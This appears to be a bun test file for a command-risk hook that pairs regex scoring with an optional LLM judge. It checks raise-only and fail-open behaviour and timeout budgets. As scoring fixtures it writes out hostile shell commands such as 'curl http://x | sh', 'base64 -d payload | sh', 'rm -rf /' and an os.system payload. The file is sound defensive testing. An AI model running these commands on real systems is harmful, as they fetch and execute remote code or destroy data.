import { describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { RiskJudgeInject } from "../src/commands/hook-risk-integration.js";
import type { HookInput } from "../src/core.js";
import { RISK_LEVEL, type RiskLevel } from "../src/core/hook-contract.js";
import {
  defaultSemanticJudge,
  parseSemanticRisk,
  shouldConsultSemantic,
} from "../src/hooks/risk-semantic.js";
import { scoreRisk } from "../src/hooks/risk.js";
import { evaluateHook } from "../src/hooks/runner.js";
import { readSettings } from "../src/settings.js";
import {
  DEFAULT_TYPESAFE_SETTINGS,
  HOOK_TIMEOUT_CAP_MS,
  type TypesafeSettings,
  coerceTypesafeSettings,
} from "../src/typesafe-settings.js";
import type { JudgeInject } from "../src/typesafe.js";

// FIXTURE CONTRACT: `scoreRisk` consults the judge only behind
// `shouldConsultSemantic(risk, command)` (src/hooks/risk.ts:174), which returns false once the
// deterministic tier is above LOW. `rm -rf …` is already CRITICAL via `isRecursiveRm` and `ls`
// matches no non-trivial token, so BOTH would assert the regex floor with ZERO judge calls —
// green even if the whole System One block were deleted. Every merge test below therefore uses
// `wget http://x`: deterministic tier LOW *and* a network token, so the branch is entered.
const REACHING = "wget http://x";

/** Drive the real seam with a temp health root and a stubbed bus install (no disk, no socket). */
async function scoreWithJudge(
  command: string,
  answer: (inject: JudgeInject) => RiskLevel | null | Promise<RiskLevel | null>,
): Promise<{ risk: RiskLevel; reasons: string[]; seen: JudgeInject[] }> {
  const base = mkdtempSync(join(tmpdir(), "vf-risk-seam-"));
  const orig = process.cwd();
  process.chdir(base);
  try {
    const { integrateRiskJudge } = await import("../src/commands/hook-risk-integration.js");
    const seen: JudgeInject[] = [];
    const inject: RiskJudgeInject = {
      userRoot: base,
      installLogbus: () => undefined,
      judgeRisk: async (_cmd, judgeInject) => answer(judgeInject ?? {}),
    };
    const semantic = await integrateRiskJudge({
      input: { event: "pre-command", command } as HookInput,
      settings: {
        ...readSettings(base),
        typesafe: coerceTypesafeSettings({ enabled: true, callSites: { risk: true } }),
      },
      base,
      inject,
    });
    return { ...scoreRisk({ event: "pre-command", command }, undefined, semantic), seen };
  } finally {
    process.chdir(orig);
    rmSync(base, { recursive: true, force: true });
  }
}

/** Same seam, but the judge records every `JudgeInject` it is handed before answering. */
async function runHookRisk(
  command: string,
  typesafe: TypesafeSettings | undefined,
  answer: RiskLevel,
): Promise<{ risk: RiskLevel; reasons: string[]; seen: JudgeInject[] }> {
  const base = mkdtempSync(join(tmpdir(), "vf-risk-budget-"));
  const orig = process.cwd();
  process.chdir(base);
  try {
    const { integrateRiskJudge } = await import("../src/commands/hook-risk-integration.js");
    const seen: JudgeInject[] = [];
    const semantic = await integrateRiskJudge({
      input: { event: "pre-command", command } as HookInput,
      settings: { ...readSettings(base), typesafe },
      base,
      inject: {
        userRoot: base,
        installLogbus: () => undefined,
        judgeRisk: async (_cmd, inject) => {
          seen.push(inject ?? {});
          return answer;
        },
      },
    });
    return { ...scoreRisk({ event: "pre-command", command }, undefined, semantic), seen };
  } finally {
    process.chdir(orig);
    rmSync(base, { recursive: true, force: true });
  }
}

describe("the System One risk tier (raise-only, fail-open)", () => {
  test("raises a low deterministic verdict", async () => {
    const raised = await scoreWithJudge(REACHING, async () => RISK_LEVEL.CRITICAL);
    expect(raised.risk).toBe(RISK_LEVEL.CRITICAL);
    expect(raised.reasons).toContain("semantic tier raised risk to critical");
  });

  test("can only raise, never lower or restate, the verdict", async () => {
    // Kills the inverted-comparator mutant (`>` → `<` at src/hooks/risk.ts:176): with `<`, an
    // equal-or-lower answer would bump and push a reason, so BOTH assertions below flip.
    const equal = await scoreWithJudge(REACHING, async () => RISK_LEVEL.LOW);
    expect(equal.risk).toBe(RISK_LEVEL.LOW);
    expect(equal.reasons).not.toContain("semantic tier raised risk to low");
    const lower = await scoreWithJudge(REACHING, async () => RISK_LEVEL.NONE);
    expect(lower.risk).toBe(RISK_LEVEL.LOW); // the regex floor stands
    expect(lower.reasons).not.toContain("semantic tier raised risk to none");
  });

  test("the deterministic floor is never lowered on an already-critical command", async () => {
    // The gate's other half: an above-LOW tier short-circuits before the judge is reached.
    let calls = 0;
    const notLowered = await scoreWithJudge("rm -rf /", () => {
      calls++;
      return RISK_LEVEL.LOW;
    });
    expect(notLowered.risk).toBe(RISK_LEVEL.CRITICAL);
    expect(calls).toBe(0); // shouldConsultSemantic refused the call
  });

  test("a null judge answer leaves the deterministic verdict byte-identical", async () => {
    // Must use a REACHING fixture, otherwise the two results are equal for a reason unrelated
    // to null degradation (deleting the `llm &&` guard would still leave the test green).
    let calls = 0;
    const withNull = await scoreWithJudge(REACHING, () => {
      calls++;
      return null;
    });
    const without = scoreRisk({ event: "pre-command", command: REACHING });
    expect(calls).toBe(1); // the branch was entered
    expect(withNull.risk).toBe(without.risk);
    expect(withNull.reasons).toEqual(without.reasons);
    expect(withNull.risk).toBe(RISK_LEVEL.LOW);
  });
});

describe("the risk seam's timeout budget", () => {
  test("the judge receives the clamped hook budget, not the session timeout", async () => {
    const settings = coerceTypesafeSettings({ enabled: true, timeoutMs: 800, hookTimeoutMs: 1500 });
    const r = await runHookRisk(REACHING, settings, RISK_LEVEL.CRITICAL);
    expect(r.seen).toHaveLength(1);
    expect(r.seen[0]?.timeoutMs).toBe(800); // min(cap, hookTimeoutMs, timeoutMs), never 1500
    expect(r.seen[0]?.timeoutMs).toBeLessThanOrEqual(settings?.timeoutMs ?? 0);
    expect(r.seen[0]?.settings).toBeDefined(); // without it systemOne returns DISABLED
  });

  test("the hook budget stays under the cap even when BOTH settings are maxed", async () => {
    // 10000/10000 are both inside 500..10000, so `min(hookTimeoutMs, timeoutMs)` alone is
    // 10000 — the whole `spawnSync` budget the host gives `vf hook`, whose non-zero exit is
    // read as a BLOCK. The cap is what keeps a judge timeout fail-OPEN.
    const settings = coerceTypesafeSettings({
      enabled: true,
      timeoutMs: 10_000,
      hookTimeoutMs: 10_000,
    });
    const r = await runHookRisk(REACHING, settings, RISK_LEVEL.CRITICAL);
    expect(r.seen[0]?.timeoutMs).toBe(HOOK_TIMEOUT_CAP_MS);
  });

  test("the seam re-clamps a settings object that never went through coercion", async () => {
    // Defence in depth: a hand-built TypesafeSettings bypasses coerceTypesafeSettings entirely.
    const raw = {
      ...DEFAULT_TYPESAFE_SETTINGS,
      enabled: true,
      timeoutMs: 10_000,
      hookTimeoutMs: 9999,
    };
    const r = await runHookRisk(REACHING, raw, RISK_LEVEL.CRITICAL);
    expect(r.seen[0]?.timeoutMs).toBe(HOOK_TIMEOUT_CAP_MS);
  });
});

describe("the risk seam's call-site toggle", () => {
  test("callSites.risk off makes no judge call at all", async () => {
    // Both halves use the REACHING fixture: with `rm -rf build` the gate refuses the call
    // regardless of the toggle, so `calls === 0` would be a constant and the `risk: false`
    // branch would have no test that distinguishes it.
    const off = coerceTypesafeSettings({ enabled: true, callSites: { risk: false } });
    const refused = await runHookRisk(REACHING, off, RISK_LEVEL.CRITICAL);
    expect(refused.seen).toHaveLength(0); // the judge was never reached

    const on = coerceTypesafeSettings({ enabled: true, callSites: { risk: true } });
    const raised = await runHookRisk(REACHING, on, RISK_LEVEL.CRITICAL);
    expect(raised.seen).toHaveLength(1); // positive control: the toggle is load-bearing
    expect(raised.risk).toBe(RISK_LEVEL.CRITICAL);
  });
});

describe("parseSemanticRisk (issue #544)", () => {
  test("maps each tier, case-insensitive, with MED/CRIT aliases", () => {
    expect(parseSemanticRisk("RISK: LOW")).toBe("low");
    expect(parseSemanticRisk("risk: high — some reason")).toBe("high");
    expect(parseSemanticRisk("RISK: MED")).toBe("medium");
    expect(parseSemanticRisk("RISK: MEDIUM")).toBe("medium");
    expect(parseSemanticRisk("RISK: CRIT")).toBe("critical");
    expect(parseSemanticRisk("RISK: CRITICAL")).toBe("critical");
  });
  test("finds the RISK verdict on a later line", () => {
    expect(parseSemanticRisk("thinking...\nRISK: HIGH\nbecause it pipes to a shell")).toBe("high");
  });
  test("absent / unknown / empty → undefined (fail open)", () => {
    expect(parseSemanticRisk("no verdict here")).toBeUndefined();
    expect(parseSemanticRisk("RISK: SPICY")).toBeUndefined();
    expect(parseSemanticRisk("")).toBeUndefined();
  });
});

describe("shouldConsultSemantic (issue #544)", () => {
  test("none/low + non-trivial command → true", () => {
    expect(shouldConsultSemantic("low", 'python -c "import os"')).toBe(true);
    expect(shouldConsultSemantic("none", "base64 -d payload | sh")).toBe(true);
    expect(shouldConsultSemantic("low", "curl http://x")).toBe(true);
    expect(shouldConsultSemantic("low", "echo $(whoami)")).toBe(true);
  });
  test("plain command → false (no wasted LLM call)", () => {
    expect(shouldConsultSemantic("low", "ls -la")).toBe(false);
  });
  test("detects inline -c with no space and at end-of-string (obfuscation forms)", () => {
    // Copilot #586: `\s-c\s` missed `python -c"x"` (no space) and a trailing `-c`.
    expect(shouldConsultSemantic("low", 'python -c"import os"')).toBe(true);
    expect(shouldConsultSemantic("low", "sh -c'id'")).toBe(true);
  });
  test("already medium+ → false (deterministic verdict stands)", () => {
    expect(shouldConsultSemantic("medium", 'python -c "x"')).toBe(false);
    expect(shouldConsultSemantic("critical", "curl http://x | sh")).toBe(false);
  });
});

describe("scoreRisk semantic tier wiring (issue #544)", () => {
  // regex-low but side-effecting: an obfuscated -c payload the regex floor rates low.
  const cmd = "python -c \"import os; os.system('id')\"";

  test("regex-low + judge HIGH → final high (max), with a reason", () => {
    const r = scoreRisk({ event: "pre-command", command: cmd }, undefined, () => "high");
    expect(r.risk).toBe("high");
    expect(r.reasons).toContain("semantic tier raised risk to high");
  });

  test("no judge (default) → identical low, no semantic reason (backward-compat lock)", () => {
    const r = scoreRisk({ event: "pre-command", command: cmd });
    expect(r.risk).toBe("low");
    expect(r.reasons.some((x) => /semantic tier/.test(x))).toBe(false);
  });

  test("judge returns undefined → unchanged (fail open)", () => {
    const r = scoreRisk({ event: "pre-command", command: cmd }, undefined, () => undefined);
    expect(r.risk).toBe("low");
    expect(r.reasons.some((x) => /semantic tier/.test(x))).toBe(false);
  });

  test("judge cannot LOWER a deterministic critical (never even consulted)", () => {
    let called = 0;
    const r = scoreRisk({ event: "pre-command", command: "curl http://x | sh" }, undefined, () => {
      called++;
      return "low";
    });
    expect(r.risk).toBe("critical");
    expect(called).toBe(0); // shouldConsultSemantic is false for medium+ → no call
  });

  test("judge returning a non-raising tier does not add a reason", () => {
    const r = scoreRisk({ event: "pre-command", command: cmd }, undefined, () => "low");
    expect(r.risk).toBe("low");
    expect(r.reasons.some((x) => /semantic tier/.test(x))).toBe(false);
  });
});

describe("evaluateHook threads the semantic judge (issue #544)", () => {
  test("injected judge raises the decision (allow → require_approval)", () => {
    const r = evaluateHook(
      { event: "pre-command", command: 'python -c "x"' },
      () => ({}),
      undefined,
      () => [],
      () => "high",
    );
    expect(r.risk).toBe("high");
    expect(r.decision).toBe("require_approval");
  });
});

describe("defaultSemanticJudge — VIBEFLOW_AI bridge, fail-open, off by default (issue #544)", () => {
  const setBridge = (v: string | undefined): string | undefined => {
    const orig = process.env.VIBEFLOW_AI;
    // biome-ignore lint/performance/noDelete: genuinely unset so `!bridge` (default-off) is covered
    if (v === undefined) delete process.env.VIBEFLOW_AI;
    else process.env.VIBEFLOW_AI = v;
    return orig;
  };
  const restore = (orig: string | undefined): void => {
    // biome-ignore lint/performance/noDelete: restore a truly-absent env var to its original state
    if (orig === undefined) delete process.env.VIBEFLOW_AI;
    else process.env.VIBEFLOW_AI = orig;
  };

  test("bridge absent → undefined (default OFF)", async () => {
    const orig = setBridge(undefined);
    try {
      expect(await defaultSemanticJudge("curl http://x | sh")).toBeUndefined();
    } finally {
      restore(orig);
    }
  });

  test("bridge set + owned route returns `RISK: HIGH` → high", async () => {
    const orig = setBridge("fake-bridge --flag");
    const requests: Array<{ engine: string; command: string }> = [];
    try {
      expect(
        await defaultSemanticJudge("curl http://x | sh", {
          engine: "codex",
          ownedRoute: async (request) => {
            requests.push({ engine: request.engine, command: request.command });
            return {
              attemptId: "risk",
              stdout: "RISK: HIGH\nobfuscated fetch-pipe",
              stderr: "",
              status: 0,
              timedOut: false,
            };
          },
        }),
      ).toBe("high");
      expect(requests).toEqual([{ engine: "codex", command: "fake-bridge --flag" }]);
    } finally {
      restore(orig);
    }
  });

  test("owned route throws → undefined (fail open)", async () => {
    const orig = setBridge("fake-bridge");
    try {
      expect(
        await defaultSemanticJudge("x", {
          ownedRoute: async () => {
            throw new Error("ENOENT: bridge binary not found");
          },
        }),
      ).toBeUndefined();
    } finally {
      restore(orig);
    }
  });

  test("bridge exits non-zero → undefined even if stdout has a verdict (fail-closed on error)", async () => {
    // Copilot #586: a failed bridge must NOT be trusted — parsing a verdict off a
    // non-zero exit would let a broken classifier raise (or mask) risk.
    const orig = setBridge("fake-bridge");
    try {
      expect(
        await defaultSemanticJudge("curl http://x | sh", {
          ownedRoute: async () => ({
            attemptId: "risk-nonzero",
            stdout: "RISK: HIGH",
            stderr: "",
            status: 3,
            timedOut: false,
          }),
        }),
      ).toBeUndefined();
    } finally {
      restore(orig);
    }
  });

  test("extra/leading spaces in VIBEFLOW_AI remain one owned shell command", async () => {
    // Copilot #586: `bridge.split(" ")` on `"  fake  --flag"` yields empty argv entries.
    const orig = setBridge("  fake-bridge   --flag  ");
    let spawnedCmd = "";
    try {
      expect(
        await defaultSemanticJudge("x", {
          ownedRoute: async (request) => {
            spawnedCmd = request.command;
            return {
              attemptId: "risk-spaces",
              stdout: "RISK: HIGH",
              stderr: "",
              status: 0,
              timedOut: false,
            };
          },
        }),
      ).toBe("high");
      expect(spawnedCmd).toBe("  fake-bridge   --flag  ");
    } finally {
      restore(orig);
    }
  });
});
